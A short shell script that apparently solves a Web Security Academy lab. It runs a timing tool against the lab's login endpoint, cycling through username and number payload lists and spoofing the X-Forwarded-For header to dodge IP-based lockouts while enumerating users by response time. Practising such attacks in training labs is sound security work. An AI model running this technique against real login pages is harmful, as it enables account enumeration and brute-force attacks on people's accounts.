#!/bin/sh

python3 request_timer.py https://0a8200a003ee868881db34d5008d001d.web-security-academy.net/login \
 --http-version 2 \
 -p payloads/numbers.txt payloads/users.txt \
 -b "username=§2§&password=peter" \
 -H "Content-Type: application/x-www-form-urlencoded" \
 -H "X-Forwarded-For: §1§" \
 -X POST
